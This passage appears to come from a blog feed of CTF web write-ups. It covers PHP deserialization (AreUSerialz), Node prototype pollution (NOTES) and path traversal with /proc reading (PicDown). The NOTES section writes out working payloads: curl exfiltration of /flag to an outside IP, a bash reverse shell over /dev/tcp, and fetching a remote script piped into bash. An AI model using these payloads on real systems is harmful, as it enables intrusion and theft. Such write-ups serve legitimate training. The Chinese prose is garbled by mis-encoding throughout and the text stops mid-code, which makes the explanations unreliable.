è½½é™æ€æ–‡ä»¶è¿”å›çš„å†…å®¹ä¹Ÿæ˜¯åŒä½¿ç”¨å‚æ•°2è®¿é—®æ—¶è¿”å›å†…å®¹ç›¸åŒï¼Œä½†æ˜¯æµè§ˆå™¨å°†ä¼šè®¤ä¸ºè¿™é‡ŒåŠ è½½çš„æ˜¯æ ·å¼æ–‡ä»¶å’Œè„šæœ¬æ–‡ä»¶ï¼Œä»è€Œå°†è¿”å›å†…å®¹è§£æä¸ºcssæˆ–è€…jsï¼Œæ‰€ä»¥æˆ‘ä»¬æäº¤çš„csså†…å®¹ï¼š<code>&#123;&#125; * &#123;color:red;&#125; </code>æˆåŠŸè§£æä¸ºcssï¼Œå°†é¡µé¢æ¸²æŸ“æˆçº¢è‰²ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸ªå…³é”®å°±æ˜¯CSSåœ¨åŠ è½½çš„æ—¶å€™ä¸JSä¸€æ ·æ˜¯é€è¡Œè§£æçš„ï¼Œä¸åŒçš„æ˜¯CSSä¼šå¿½ç•¥é¡µé¢ä¸­ä¸ç¬¦åˆCSSè¯­æ³•çš„è¡Œã€‚</p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p><a href="https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/">https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/</a></p><p><a href="https://www.secpulse.com/archives/128882.html">https://www.secpulse.com/archives/128882.html</a></p>]]></content>
    
    
    <categories>
      
      <category>xss</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘é¼æ¯åšé¢˜è®°å½•</title>
    <link href="/2021/09/01/2021-9-1-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/"/>
    <url>/2021/09/01/2021-9-1-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</url>
    
    <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œåˆ†æä¸€ä¸‹å°±æ˜¯ç”¨<code>op</code>çš„å€¼æ§åˆ¶æ˜¯è¯»è¿˜æ˜¯å†™çš„æ“ä½œï¼Œè¿™é‡Œç›´æ¥æƒ³åˆ°çš„æ˜¯è¯»flag.phpï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªç‚¹è¦ç»•è¿‡ã€‚ç¬¬ä¸€ä¸ªå°±æ˜¯</p><p><code>is_valid</code>å‡½æ•°é™åˆ¶åºåˆ—åŒ–<code>protected</code>æ—¶äº§ç”Ÿçš„0x00ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯<code>__destruct() </code>å‡½æ•°åˆ¤æ–­<code>op===2</code>ä½¿opä¸º1æ˜¯å†™å…¥æ“ä½œï¼ŒåŒæ—¶è®©contentä¸ºç©ºå­—ç¬¦ï¼Œè¿™æ ·å°±å†™äº†ä¸ªå¯‚å¯ã€‚</p><h4 id="è§£æ³•ä¸€ï¼š"><a href="#è§£æ³•ä¸€ï¼š" class="headerlink" title="è§£æ³•ä¸€ï¼š"></a>è§£æ³•ä¸€ï¼š</h4><p>åˆ©ç”¨php&gt;7.1ç‰ˆæœ¬æ—¶å¯¹äº<code>public</code> <code>protected</code>å¹¶ä¸æ•æ„Ÿï¼Œåºåˆ—åŒ–æ—¶å¯ç›´æ¥ç”¨<code>public</code>ï¼Œè®©<code>op</code>ç­‰äºæ•°å­—2ï¼Œå¼ºå¼±ç±»å‹æ¯”è¾ƒä¸è§£é‡Šäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br><span class="hljs-variable">$demo</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$demo</span>;<br><span class="hljs-comment">#è¾“å‡º&lt;/code&gt;[Result]: &lt;br&gt;&lt;?php $flag=&#x27;flag&#123;ce554f72-394d-480a-94e4-f42e3362042b&#125;&#x27;;</span><br></code></pre></div></td></tr></table></figure><h4 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h4><p>å°†<code>protected</code>åºåˆ—åŒ–å‡ºæ¥çš„så˜æˆSï¼Œasciiç©ºå­—ç¬¦æ”¹æˆåå…­è¿›åˆ¶\00å³å¯</p><p>çœ‹äº†çœ‹wpï¼Œä¼¼ä¹buuè¿™ä¸ªç¯å¢ƒå’Œå½“æ—¶æ¯”èµ›æ—¶ä¹Ÿä¸ä¸€æ ·ï¼Œå½“æ—¶è¿˜éœ€è¦è¯»è·¯å¾„ï¼Œå› ä¸º<code>apache</code>é…ç½®ä¸‹destructå‡½æ•°åœ¨æ‰§è¡Œæ—¶å°±ä¸åœ¨æœ¬ç›®å½•äº†ï¼Œè¿™ä¸ªå¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/fwkjdaghappy1/article/details/7631475%EF%BC%8C%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%AF%B9%E4%B8%8D%E5%87%BA%E6%9D%A5flag%EF%BC%8C%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%EF%BC%8C/proc/self/cmdline%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">https://blog.csdn.net/fwkjdaghappy1/article/details/7631475ï¼Œç”¨ç›¸å¯¹è·¯å¾„å¯¹ä¸å‡ºæ¥flagï¼Œæƒ³è¦è·å–ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡è¯»å–ï¼Œ/proc/self/cmdlineï¼Œç„¶åå¯ä»¥çŸ¥é“é…ç½®æ–‡ä»¶è·¯å¾„</a> /web/config/httpd.confã€‚</p><h1 id="NOTES"><a href="#NOTES" class="headerlink" title="NOTES"></a>NOTES</h1><p>å®¡è®¡æºç <code>edit_not</code>è·¯ç”±å­˜åœ¨å†™å…¥æ“ä½œ</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">app.route(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> id = req.body.id;<br>        <span class="hljs-keyword">let</span> author = req.body.author;<br>        <span class="hljs-keyword">let</span> enote = req.body.raw;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.edit_note(id, author, enote);<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></div></td></tr></table></figure><p>å†™å…¥æ“ä½œç”¨çš„æ˜¯undersafeï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œå†å¾€ä¸‹çœ‹å‘ç°æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åœ¨è¾“å‡ºï¼Œè¿™é‡Œå°†æ±¡æŸ“commandså­—å…¸æ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">app.route(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            exec(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.send(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.end();<br>    &#125;)<br><br></code></pre></div></td></tr></table></figure><p>ä»¤commandå¤šäº†ä¸€ä¸ªé”®å€¼å¯¹ author:ç³»ç»Ÿå‘½ä»¤ï¼Œéå†æ—¶è‡ªåŠ¨æ‰§è¡Œ<br>/edit_note postä¼ å‚ id=<em>proto</em>.bb&amp;author=curl -F â€˜flag=@/flagâ€™ 174.1.84.222:2333&amp;raw=a<br>æˆ–è€…ï¼šid=_proto_ï¼Œauthor=bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1ï¼Œraw=123<br>id=<em>proto</em>.abc&amp;author=curl%20ip:port/shell.txt|bash&amp;raw=a<br>id=<em>proto</em>&amp;author=cat /flag&gt;/dev/tcp/xxxxx/7777&amp;raw=123</p><p>è¿™é‡Œéœ€è¦ç”¨buuå°å·é‡å¼€ä¸€ä¸ªLinux Labsåå¼¹ï¼Œå› ä¸ºbuuåªèƒ½åå¼¹shellåˆ°å†…ç½‘ã€‚</p><h1 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h1><p>æ‰“å¼€ç•Œé¢çœ‹äº†ä¸€ä¸‹getå‚æ•°æœ‰<code>url</code>ç®€å•è¯•äº†ä¸‹å°±å‡ºæ¥äº†<code>../../../../../../../../../flag</code>ã€‚ã€‚è‚¯å®šä¸æ˜¯é¢„æœŸè§£ï¼Œçœ‹ä¸€ä¸‹é¢„æœŸè§£ã€‚</p><h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>åˆè€ƒäº†ä¸‹å…³äºè¿›ç¨‹ä¿¡æ¯çš„ä¸œè¥¿ã€‚å‚è€ƒï¼š<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">https://blog.csdn.net/shenhuxi_yu/article/details/79697792</a></p><p>åœ¨/proc æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æ–‡ä»¶ ã€‚ä¸‹é¢æ˜¯/proc ç›®å½•ä¸‹çš„ä¸€äº›é‡è¦æ–‡ä»¶ ï¼š</p><p>/proc/pid/cmdline åŒ…å«äº†ç”¨äºå¼€å§‹è¿›ç¨‹çš„å‘½ä»¤ ï¼›</p><p>/proc/pid/cwd åŒ…å«äº†å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•çš„ä¸€ä¸ªé“¾æ¥ ï¼›</p><p>/proc/pid/environ åŒ…å«äº†å¯ç”¨è¿›ç¨‹ç¯å¢ƒå˜é‡çš„åˆ—è¡¨ ï¼›</p><p>/proc/pid/exe åŒ…å«äº†æ­£åœ¨è¿›ç¨‹ä¸­è¿è¡Œçš„ç¨‹åºé“¾æ¥ï¼›</p><p>/proc/pid/fd/ è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ï¼›</p><p>/proc/pid/mem åŒ…å«äº†è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼›</p><p>/proc/pid/stat åŒ…å«äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼›</p><p>/proc/pid/statm åŒ…å«äº†è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨ä¿¡æ¯ã€‚</p><p>PIDä¸€åˆ—ä»£è¡¨äº†å„è¿›ç¨‹çš„è¿›ç¨‹ID,ä¹Ÿå°±æ˜¯è¯´,PIDå°±æ˜¯å„è¿›ç¨‹çš„èº«ä»½æ ‡è¯†ã€‚<code>/proc/self</code>è¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•</p><p>è¿™é‡Œç”¨åˆ°äº†<code>/proc/self/cmdline</code>è¯»å–å½“å‰è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œç”¨python2æ‰§è¡Œäº†app.pyè„šæœ¬ï¼Œè¯»å–ä¸€ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span><br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span><br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span 